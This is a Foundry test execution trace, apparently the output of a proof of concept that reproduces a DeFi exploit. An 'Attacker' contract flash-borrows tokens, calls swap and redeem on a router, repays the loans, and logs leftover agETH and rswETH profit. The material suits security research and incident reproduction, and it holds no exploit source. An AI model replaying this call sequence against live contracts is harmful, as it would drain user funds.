+    │   │   │   │   │   │   ├─ [1038] 0xC6378a93725E499a20DF8F00aE31D9ce9D09F1CA::4af74b68(000000000000000000000000000000000000000000000000000000000000000f00000000000000000000000000000000000000000000000000000000000000dc0000000000000000000000000000000000000000000000000000000066d756d300000000000000000000000000000000000000000000000001812fcba867af6900000000000000000000000000000000000000000000000000000000000001490000000000000000000000000000000000000000000000000000000000000149) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000dc0000000000000000000000000000000000000000000000000000000000000149
+    │   │   │   │   │   │   ├─  emit topic 0: 0x5c0e21d57bb4cf91d8fe238d6f92e2685a695371b19209afcce6217b478f83e1
+    │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000000000000000000000000000000000000066d756d3
+    │   │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000001ca63493c9c22fb
+    │   │   │   │   │   │   ├─ [577] 0xF0574d8B9Dc3a9DE768eaa7DBB7bB0C68521b148::balanceOf(0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 2829465392451590859578 [2.829e21]
+    │   │   │   │   │   │   ├─ emit Swap(param0: 0x888888888889758F76e7103c6CbF23ABbF58F946, param1: 0x7786729eEe8b9d30fE7d91fDFf23A0f1D0C615D9, param2: -587198197462925704671 [-5.871e20], param3: 572487576684580830382 [5.724e20], param4: 34843753045288804 [3.484e16], param5: 27875002436231042 [2.787e16])
+    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001f08dc71d350a3fcae000000000000000000000000000000000000000000000000007bca3572e7e764
+    │   │   │   │   │   ├─ [31295] 0x7786729eEe8b9d30fE7d91fDFf23A0f1D0C615D9::redeem(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1808139014188461826770 [1.808e21], 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0, 0, true)
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x7786729eEe8b9d30fE7d91fDFf23A0f1D0C615D9, to: 0x0000000000000000000000000000000000000000, value: 1808139014188461826770 [1.808e21])
+    │   │   │   │   │   │   ├─ [23897] 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0::transfer(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1808139014188461826770 [1.808e21])
+    │   │   │   │   │   │   │   ├─ [23075] 0x4796D939B22027c2876d5CE9fDe52da9EC4e2362::transfer(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1808139014188461826770 [1.808e21]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x7786729eEe8b9d30fE7d91fDFf23A0f1D0C615D9, to: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 1808139014188461826770 [1.808e21])
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ emit Redeem(param0: 0x888888888889758F76e7103c6CbF23ABbF58F946, param1: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param2: 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0, param3: 1808139014188461826770 [1.808e21], param4: 1808139014188461826770 [1.808e21])
+    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000006204f835792c41a2d2
+    │   │   │   │   │   ├─  emit topic 0: 0x5258a3c624debb1cc84b0f5f66c73eef048832eeebe7178e63e95a53cf28dc94
+    │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   │   │   │   │        topic 2: 0x000000000000000000000000038c1b03dab3b891afbca4371ec807edaa3e6eb6
+    │   │   │   │   │   │        topic 3: 0x000000000000000000000000fae103dc9cf190ed75350761e95403b7b8afa6c0
+    │   │   │   │   │   │           data: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000000000000000000000000031ba6dfd1e7d98bbf100000000000000000000000000000000000000000000006204f835792c41a2d200000000000000000000000000000000000000000000006204f835792c41a2d2
+    │   │   │   │   │   └─ ← [Return] 1808139014188461826770 [1.808e21], 34843753045288804 [3.484e16], 1808139014188461826770 [1.808e21]
+    │   │   │   │   └─ ← [Return] 1808139014188461826770 [1.808e21], 34843753045288804 [3.484e16], 1808139014188461826770 [1.808e21]
+    │   │   │   ├─ [1550] 0xe1B4d34E8754600962Cd944B535180Bd758E6c2e::balanceOf(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   ├─ [761] 0x9C3D4B06D89a19F560E7da76e3a45B1410Ea8634::balanceOf(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 2754866636494960276073 [2.754e21]
+    │   │   │   │   └─ ← [Return] 2754866636494960276073 [2.754e21]
+    │   │   │   ├─ [7674] 0xe1B4d34E8754600962Cd944B535180Bd758E6c2e::transfer(0xBA12222222228d8Ba445958a75a0704d566BF2C8, 1387144695760709012655 [1.387e21])
+    │   │   │   │   ├─ [6882] 0x9C3D4B06D89a19F560E7da76e3a45B1410Ea8634::transfer(0xBA12222222228d8Ba445958a75a0704d566BF2C8, 1387144695760709012655 [1.387e21]) [delegatecall]
+    │   │   │   │   │   ├─ emit Transfer(from: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0xBA12222222228d8Ba445958a75a0704d566BF2C8, value: 1387144695760709012655 [1.387e21])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [1461] 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0::balanceOf(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   ├─ [642] 0x4796D939B22027c2876d5CE9fDe52da9EC4e2362::balanceOf(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 1808139014188461826770 [1.808e21]
+    │   │   │   │   └─ ← [Return] 1808139014188461826770 [1.808e21]
+    │   │   │   ├─ [3997] 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0::transfer(0xBA12222222228d8Ba445958a75a0704d566BF2C8, 906345923203725548764 [9.063e20])
+    │   │   │   │   ├─ [3175] 0x4796D939B22027c2876d5CE9fDe52da9EC4e2362::transfer(0xBA12222222228d8Ba445958a75a0704d566BF2C8, 906345923203725548764 [9.063e20]) [delegatecall]
+    │   │   │   │   │   ├─ emit Transfer(from: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0xBA12222222228d8Ba445958a75a0704d566BF2C8, value: 906345923203725548764 [9.063e20])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [1550] 0xe1B4d34E8754600962Cd944B535180Bd758E6c2e::balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8) [staticcall]
+    │   │   │   ├─ [761] 0x9C3D4B06D89a19F560E7da76e3a45B1410Ea8634::balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8) [delegatecall]
+    │   │   │   │   └─ ← [Return] 1387144695760709012655 [1.387e21]
+    │   │   │   └─ ← [Return] 1387144695760709012655 [1.387e21]
+    │   │   ├─ emit FlashLoan(param0: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: 0xe1B4d34E8754600962Cd944B535180Bd758E6c2e, param2: 1387144695760709012655 [1.387e21], param3: 0)
+    │   │   ├─ [1461] 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0::balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8) [staticcall]
+    │   │   │   ├─ [642] 0x4796D939B22027c2876d5CE9fDe52da9EC4e2362::balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8) [delegatecall]
+    │   │   │   │   └─ ← [Return] 906345923203725548764 [9.063e20]
+    │   │   │   └─ ← [Return] 906345923203725548764 [9.063e20]
+    │   │   ├─ emit FlashLoan(param0: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0, param2: 906345923203725548764 [9.063e20], param3: 0)
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Stop] 
+    ├─ [1550] 0xe1B4d34E8754600962Cd944B535180Bd758E6c2e::balanceOf(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   ├─ [761] 0x9C3D4B06D89a19F560E7da76e3a45B1410Ea8634::balanceOf(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
+    │   │   └─ ← [Return] 1367721940734251263418 [1.367e21]
+    │   └─ ← [Return] 1367721940734251263418 [1.367e21]
+    ├─ [0] console::log("Final balance in agETH :", 1367721940734251263418 [1.367e21]) [staticcall]
+    │   └─ ← [Stop] 
+    ├─ [1461] 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0::balanceOf(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   ├─ [642] 0x4796D939B22027c2876d5CE9fDe52da9EC4e2362::balanceOf(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
+    │   │   └─ ← [Return] 901793090984736278006 [9.017e20]
+    │   └─ ← [Return] 901793090984736278006 [9.017e20]
+    ├─ [0] console::log("Final balance in rswETH:", 901793090984736278006 [9.017e20]) [staticcall]
+    │   └─ ← [Stop] 
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 38.07s (36.89s CPU time)
+
+Ran 2 test suites in 38.50s (38.64s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
